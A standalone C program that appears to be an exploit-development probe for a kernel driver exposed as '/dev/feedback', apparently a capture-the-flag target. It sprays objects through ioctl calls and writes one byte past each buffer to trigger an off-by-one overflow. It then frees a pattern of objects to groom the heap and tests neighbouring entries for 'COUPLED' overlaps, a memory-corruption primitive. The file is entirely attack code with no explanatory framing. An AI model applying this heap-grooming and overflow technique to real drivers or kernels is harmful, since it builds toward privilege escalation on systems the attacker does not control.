#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/feedback"
#define CMD_CREATE 0xc0207300u
#define CMD_DELETE 0xc0207301u
#define CMD_READ   0xc0207302u

struct request {
    uint64_t id;
    uint64_t size;
    char *name;
    char *feedback;
};

static int xioctl(int fd, uint32_t cmd, struct request *req) {
    errno = 0;
    return ioctl(fd, cmd, req);
}

static int create_fb(int fd, uint64_t id, uint64_t size, unsigned char fill, unsigned char ov) {
    char *name = malloc(0x100);
    char *body = malloc(size + 1);
    if (!name || !body) exit(1);
    memset(name, 0x4e, 0xff);
    memset(body, fill, size);
    body[size] = (char)ov;
    struct request req = { .id = id, .size = size, .name = name, .feedback = body };
    int rc = xioctl(fd, CMD_CREATE, &req);
    free(name);
    free(body);
    return rc;
}

static int read_fb(int fd, uint64_t id, char *out, size_t outsz) {
    memset(out, 0, outsz);
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = out };
    return xioctl(fd, CMD_READ, &req);
}

static int del_fb(int fd, uint64_t id) {
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = NULL };
    return xioctl(fd, CMD_DELETE, &req);
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    const int n40 = 180;
    const int n30 = 220;
    const uint64_t base40 = 0xFA0000;
    const uint64_t base30 = 0xFB0000;
    const uint64_t refill = 0xFC0000;
    char out[0x80];

    unsigned char marker[180];
    for (int i = 0; i < n40; i++) marker[i] = (unsigned char)(0x40 + (i % 40));

    for (int i = 0; i < n40; i++) create_fb(fd, base40 + i, 0x40, marker[i], 0x5a);
    for (int i = 0; i < n40; i++) if ((i % 3) == 0 || (i % 11) == 0) del_fb(fd, base40 + i);
    for (int i = 0; i < n30; i++) create_fb(fd, base30 + i, 0x30, 0x31, (unsigned char)i);
    for (int i = 0; i < 320; i++) create_fb(fd, refill + i, 0x40, 0x44, (unsigned char)((0x80 + i) & 0xff));

    uint64_t broken[180];
    int broken_n = 0;
    for (int i = 0; i < n40; i++) {
        uint64_t id = base40 + i;
        if (read_fb(fd, id, out, sizeof(out)) != 0 && errno == 22 && broken_n < 180) {
            broken[broken_n++] = id;
        }
    }
    printf("[+] broken_n=%d\n", broken_n);

    int checked = 0;
    int coupled = 0;
    for (int b = 0; b < broken_n && checked < 16; b++) {
        uint64_t bid = broken[b];
        uint64_t qid = 0;

        for (int d = -0x80; d <= 0x80; d++) {
            uint64_t cand = (uint64_t)((int64_t)bid + d);
            if (cand == bid) continue;
            if (read_fb(fd, cand, out, sizeof(out)) == 0) {
                unsigned char v = (unsigned char)out[0];
                if (v >= 0x40 && v < 0x40 + 40) {
                    qid = cand;
                    break;
                }
            }
        }
        if (!qid) continue;

        checked++;
        int rc_b0 = read_fb(fd, bid, out, sizeof(out));
        int e_b0 = errno;
        unsigned char b0 = (rc_b0 == 0) ? (unsigned char)out[0] : 0;

        int rc_q0 = read_fb(fd, qid, out, sizeof(out));
        int e_q0 = errno;
        unsigned char q0 = (rc_q0 == 0) ? (unsigned char)out[0] : 0;

        del_fb(fd, qid);
        create_fb(fd, qid, 0x40, 0x7a, 0x33);

        int rc_b1 = read_fb(fd, bid, out, sizeof(out));
        int e_b1 = errno;
        unsigned char b1 = (rc_b1 == 0) ? (unsigned char)out[0] : 0;

        int rc_q1 = read_fb(fd, qid, out, sizeof(out));
        int e_q1 = errno;
        unsigned char q1 = (rc_q1 == 0) ? (unsigned char)out[0] : 0;

        int is_coupled = (rc_b1 == 0 && b1 == 0x7a);
        if (is_coupled) coupled++;

        printf("CHK bid=%llu qid=%llu | b0=%d/e%d/v0x%02x q0=%d/e%d/v0x%02x -> b1=%d/e%d/v0x%02x q1=%d/e%d/v0x%02x %s\n",
               (unsigned long long)bid,
               (unsigned long long)qid,
               rc_b0, e_b0, b0,
               rc_q0, e_q0, q0,
               rc_b1, e_b1, b1,
               rc_q1, e_q1, q1,
               is_coupled ? "COUPLED" : "-");
    }

    printf("[+] checked=%d coupled=%d\n", checked, coupled);

    for (int i = 0; i < n40; i++) del_fb(fd, base40 + i);
    for (int i = 0; i < n30; i++) del_fb(fd, base30 + i);
    for (int i = 0; i < 320; i++) del_fb(fd, refill + i);

    close(fd);
    return 0;
}